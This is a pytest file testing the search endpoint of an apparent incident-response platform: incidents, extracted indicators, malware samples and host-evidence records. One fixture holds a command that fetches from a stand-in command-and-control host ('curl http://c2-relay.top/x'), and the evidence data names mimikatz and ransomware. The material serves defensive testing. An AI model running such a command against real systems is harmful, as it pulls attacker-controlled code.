"""Global search: incidents, indicators from every incident, samples."""

from __future__ import annotations

from fastapi.testclient import TestClient

from tests.conftest import make_key
from tests.test_malware import fake_pe


def test_search_groups(admin: TestClient):
    key = make_key(admin, roles=["analyst"])
    for incident_id, host in (("s1", "WKS-FINANCE-01"), ("s2", "SRV-FILE-01")):
        doc = {
            "id": incident_id,
            "name": host,
            "host": host,
            "data": {"commands": {"shells": {"bash": {"commands": [{"command": "curl http://c2-relay.top/x"}]}}}},
        }
        assert admin.post("/api/incidents", headers=key, json=doc).status_code == 201
    sha = admin.post("/api/incidents/s1/samples", headers=key, files={"file": ("a.exe", fake_pe())}).json()["sample"][
        "sha256"
    ]

    r = admin.get("/api/search", headers=key, params={"q": "finance"})
    assert r.status_code == 200
    assert [i["id"] for i in r.json()["incidents"]] == ["s1"]

    iocs = admin.get("/api/search", headers=key, params={"q": "c2-relay"}).json()["iocs"]
    assert {"type": "domain", "value": "c2-relay.top", "incidents": 2} in iocs

    samples = admin.get("/api/search", headers=key, params={"q": sha[:10]}).json()["samples"]
    assert [s["sha256"] for s in samples] == [sha]
    assert admin.get("/api/search", headers=key, params={"q": "PE32"}).json()["samples"][0]["sha256"] == sha

    # LIKE wildcards are matched literally; too short a query is refused.
    assert admin.get("/api/search", headers=key, params={"q": "%_"}).json()["incidents"] == []
    assert admin.get("/api/search", headers=key, params={"q": "x"}).status_code == 422


# --------------------------------------------------------------------------- #
# Host evidence                                                               #
# --------------------------------------------------------------------------- #
def _evidence_incident(admin: TestClient, key: dict, incident_id: str, summaries: list[str], start: int = 0) -> None:
    """An incident with a file of host evidence whose records say ``summaries`` (the n-th at time ``start + n``)."""
    from sqlalchemy import insert

    from app.core.db import SessionLocal
    from app.core.models import EvidenceRecord
    from app.evidence import imports, originals

    made = admin.post(
        "/api/incidents", headers=key, json={"id": incident_id, "name": f"Case {incident_id}", "data": {}}
    )
    assert made.status_code == 201
    sha256 = originals.keep_bytes(f"ElfFile\x00 {incident_id}".encode())
    with SessionLocal() as db:
        source = imports.accept(db, incident_id, sha256, 20, "Security.evtx", {"kind": "eventlog"}, "tester")
        db.commit()
        db.execute(
            insert(EvidenceRecord.__table__),
            [
                {
                    "incident_id": incident_id,
                    "source_id": source.id,
                    "kind": "eventlog",
                    "type": "event",
                    "key": f"{incident_id}:{n}",
                    "ts": start + n,
                    "seq": n,
                    "host": "WKS-1",
                    "username": "",
                    "channel": "Security",
                    "summary": summary,
                    "data": {},
                    "locator": {},
                }
                for n, summary in enumerate(summaries)
            ],
        )
        db.commit()


def test_search_finds_records_of_host_evidence_newest_first_with_where_they_are(admin: TestClient):
    key = make_key(admin, roles=["analyst"])
    _evidence_incident(admin, key, "ev1", ["Logon of mimikatz.exe by alice", "Nothing here", "Process mimikatz.exe"])
    _evidence_incident(admin, key, "ev2", ["MIMIKATZ in a command line"], start=100)
    found = admin.get("/api/search", headers=key, params={"q": "mimikatz"}).json()
    assert found["evidenceCut"] is False
    assert [(item["incidentId"], item["ts"]) for item in found["evidence"]] == [("ev2", 100), ("ev1", 2), ("ev1", 0)]
    first = found["evidence"][0]
    assert (first["incidentName"], first["section"], first["source"], first["summary"]) == (
        "Case ev2",
        "eventlog",
        "Security.evtx",
        "MIMIKATZ in a command line",
    )
    assert first["recordId"] and first["sourceId"] and first["incidentNumber"] is not None
    # Nothing found is an empty group; the wildcards of LIKE are letters; two characters are too few for it.
    assert admin.get("/api/search", headers=key, params={"q": "no-such-word"}).json()["evidence"] == []
    assert admin.get("/api/search", headers=key, params={"q": "%_%"}).json()["evidence"] == []
    assert admin.get("/api/search", headers=key, params={"q": "mi"}).json()["evidence"] == []


def test_search_of_evidence_gives_twenty_at_most(admin: TestClient):
    key = make_key(admin, roles=["analyst"])
    _evidence_incident(admin, key, "ev3", [f"beacon {n}" for n in range(30)])
    found = admin.get("/api/search", headers=key, params={"q": "beacon"}).json()["evidence"]
    assert len(found) == 20 and [item["ts"] for item in found] == list(range(29, 9, -1))


def test_search_leaves_out_archived_incidents_and_is_closed_to_a_person_who_may_not_read(admin: TestClient):
    from app.core.db import SessionLocal
    from app.core.models import Incident
    from app.main import app as fastapi_app

    key = make_key(admin, roles=["analyst"])
    _evidence_incident(admin, key, "ev4", ["ransomware note dropped"])
    _evidence_incident(admin, key, "ev5", ["ransomware note read"], start=5)
    with SessionLocal() as db:
        db.get(Incident, "ev5").archived_at = "2026-11-25T00:00:00Z"
        db.commit()
    found = admin.get("/api/search", headers=key, params={"q": "ransomware"}).json()["evidence"]
    assert [item["incidentId"] for item in found] == ["ev4"]
    # A key that may not read anything is refused, and so is a request with no key at all.
    for roles in (["connectors"], ["evidence"]):
        blind = make_key(admin, roles=roles)
        assert admin.get("/api/search", headers=blind, params={"q": "ransomware"}).status_code == 403
    assert TestClient(fastapi_app).get("/api/search", params={"q": "ransomware"}).status_code == 401


def test_search_of_evidence_is_bounded_on_sqlite_by_the_newest_records(admin: TestClient, monkeypatch):
    import pytest

    from app.core.db import engine
    from app.routers import search

    if engine.dialect.name != "sqlite":
        pytest.skip("PostgreSQL is bounded by its statement timeout instead")
    key = make_key(admin, roles=["analyst"])
    _evidence_incident(admin, key, "ev6", [f"quiet {n}" for n in range(10)])
    monkeypatch.setattr(search, "EVIDENCE_ROWS", 4)
    found = admin.get("/api/search", headers=key, params={"q": "quiet"}).json()
    assert found["evidenceCut"] is True and [item["ts"] for item in found["evidence"]] == [9, 8, 7, 6]


def test_search_of_evidence_that_the_database_cancels_still_gives_what_the_other_groups_found(
    admin: TestClient, monkeypatch
):
    from sqlalchemy.exc import OperationalError
    from sqlalchemy.orm import Session

    key = make_key(admin, roles=["analyst"])
    _evidence_incident(admin, key, "ev7", ["slow summary"])
    original = Session.execute

    def cancelled(self, statement, *args, **kwargs):
        if "evidence_records" in str(statement):
            raise OperationalError("select", {}, Exception("canceling statement due to statement timeout"))
        return original(self, statement, *args, **kwargs)

    monkeypatch.setattr(Session, "execute", cancelled)
    found = admin.get("/api/search", headers=key, params={"q": "ev7"}).json()
    assert found["evidence"] == [] and found["evidenceCut"] is True
    assert [i["id"] for i in found["incidents"]] == ["ev7"]


def test_a_search_cancelled_on_postgresql_is_tried_again_on_the_newest_records(admin: TestClient, monkeypatch):
    import pytest
    from sqlalchemy.exc import OperationalError
    from sqlalchemy.orm import Session

    from app.core.db import engine

    if engine.dialect.name != "postgresql":
        pytest.skip("only PostgreSQL has a statement timeout to be cancelled by")
    key = make_key(admin, roles=["analyst"])
    _evidence_incident(admin, key, "ev8", [f"common {n}" for n in range(6)])
    original = Session.execute
    asked: list[bool] = []

    def cancelled_once(self, statement, *args, **kwargs):
        text = str(statement)
        if "FROM evidence_records" in text and "LIKE" in text.upper():
            asked.append("evidence_records.id >" in text)
            if len(asked) == 1:
                raise OperationalError("select", {}, Exception("canceling statement due to statement timeout"))
        return original(self, statement, *args, **kwargs)

    monkeypatch.setattr(Session, "execute", cancelled_once)
    found = admin.get("/api/search", headers=key, params={"q": "common"}).json()
    assert asked == [False, True]
    assert found["evidenceCut"] is True and len(found["evidence"]) == 6
